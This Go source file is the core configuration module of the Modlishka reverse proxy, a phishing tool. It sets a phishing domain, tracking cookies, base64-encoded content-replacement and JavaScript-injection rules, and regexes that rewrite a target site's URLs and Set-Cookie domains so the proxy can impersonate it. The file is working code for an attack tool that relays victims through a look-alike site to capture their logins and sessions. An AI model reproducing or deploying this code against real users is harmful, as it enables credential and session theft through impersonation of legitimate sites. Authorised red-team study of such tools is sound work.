/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package core

import (
	"encoding/base64"
	"github.com/drk1wi/Modlishka/config"
	"golang.org/x/net/publicsuffix"
	"regexp"
	"strings"

	"github.com/drk1wi/Modlishka/log"
)

const (
	Disclaimer = ""
	Banner     = `
 _______           __ __ __         __     __          
|   |   |.-----.--|  |  |__|.-----.|  |--.|  |--.---.-.
|       ||  _  |  _  |  |  ||__ --||     ||    <|  _  |
|__|_|__||_____|_____|__|__||_____||__|__||__|__|___._|`

	TERMINATE_SESSION_COOKIE_NAME  = "c70c64fab5_terminate"
	TERMINATE_SESSION_COOKIE_VALUE = "2d022217db"

	MATCH_URL_REGEXP                = `\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|live|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`
	MATCH_URL_REGEXP_WITHOUT_SCHEME = `\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|live|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`

	SET_COOKIE             = `\b[Dd]omain[\s]{0,1}=[\s]{0,1}(([[A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9.]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|live|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3});\b`
	TRACKING_COOKIE_REGEXP = `=[a-zA-z0-9]+[\s]*[;]?`
	IS_SUBDOMAIN_REGEXP    = `^[a-zA-Z0-9\.\-]+$`
)

// compiled regexp
var (
	RegexpUrl                            *regexp.Regexp
	RegexpSubdomainWithoutScheme         *regexp.Regexp
	RegexpPhishSubdomainUrlWithoutScheme *regexp.Regexp
	RegexpCookieTracking                 *regexp.Regexp
	RegexpSubdomain                      *regexp.Regexp
	RegexpFindSetCookie                  *regexp.Regexp
	RegexpSetCookie                      *regexp.Regexp
)

//runtime config

var (
	PhishingDomain string
	TrackingCookie string
	TrackingParam  string
	TopLevelDomain string

	ReplaceStrings    map[string]string
	JSInjectStrings   map[string]string
	TargetResources   []string
	TerminateTriggers []string

	//openssl rand -hex 32
	RC4_KEY = `1b293b681a3edbfe60dee4051e14eeb81b293b681a3edbfe60dee4051e14eeb8`
)

// Set up runtime core config

func SetCoreRuntimeConfig(conf config.Options) {

	PhishingDomain = string(*conf.PhishingDomain)

	if len(*conf.TrackingCookie) > 0 {
		TrackingCookie = *conf.TrackingCookie
	}

	if len(*conf.TrackingParam) > 0 {
		TrackingParam = *conf.TrackingParam
	}

	domain, _ := publicsuffix.EffectiveTLDPlusOne(*conf.Target)
	TopLevelDomain = StripProtocol(domain)

	TargetResources = strings.Split(string(*conf.TargetRes), ",")

	if len(*conf.TerminateTriggers) != 0 {
		TerminateTriggers = strings.Split(string(*conf.TerminateTriggers), ",")
	}

	if len(*conf.TargetRules) != 0 {
		ReplaceStrings = make(map[string]string)
		for _, val := range strings.Split(string(*conf.TargetRules), ",") {
			res := strings.Split(val, ":")
			decodedKey, err := base64.StdEncoding.DecodeString(res[0])
			if err != nil {
				log.Fatalf("Unable to decode parameter value %s . Terminating.", res[0])
			}

			decodedValue, err := base64.StdEncoding.DecodeString(res[1])
			if err != nil {
				log.Fatalf("Unable to decode parameter value %s . Terminating.", res[1])
			}

			ReplaceStrings[string(decodedKey)] = string(decodedValue)
		}
	}

	if len(*conf.JsRules) != 0 {
		JSInjectStrings = make(map[string]string)
		for _, val := range strings.Split(string(*conf.JsRules), ",") {
			res := strings.Split(val, ":")
			decoded, err := base64.StdEncoding.DecodeString(res[1])
			if err != nil {
				log.Fatalf("Unable to decode parameter value %s", res[1])
			}
			JSInjectStrings[res[0]] = string(decoded)
		}
	}

}

//set up regexp upfront

func MakeRegexes() {

	var err error

	regexpStr := MATCH_URL_REGEXP
	RegexpUrl, err = regexp.Compile(regexpStr)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")

	}

	regexpStr = `(([a-z0-9.]+)+` + TopLevelDomain + `)`
	RegexpSubdomainWithoutScheme, err = regexp.Compile(regexpStr)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

	regexpStr = `(?:([a-z0-9-]+|\*)\.)?` + PhishingDomain + `\b`
	RegexpPhishSubdomainUrlWithoutScheme, err = regexp.Compile(regexpStr)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

	RegexpCookieTracking, err = regexp.Compile(TrackingCookie + TRACKING_COOKIE_REGEXP)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

	RegexpSubdomain, err = regexp.Compile(IS_SUBDOMAIN_REGEXP)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

	RegexpFindSetCookie, err = regexp.Compile(SET_COOKIE)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

	RegexpSetCookie, err = regexp.Compile(MATCH_URL_REGEXP_WITHOUT_SCHEME)
	if err != nil {
		log.Fatalf(err.Error() + "Terminating.")
	}

}
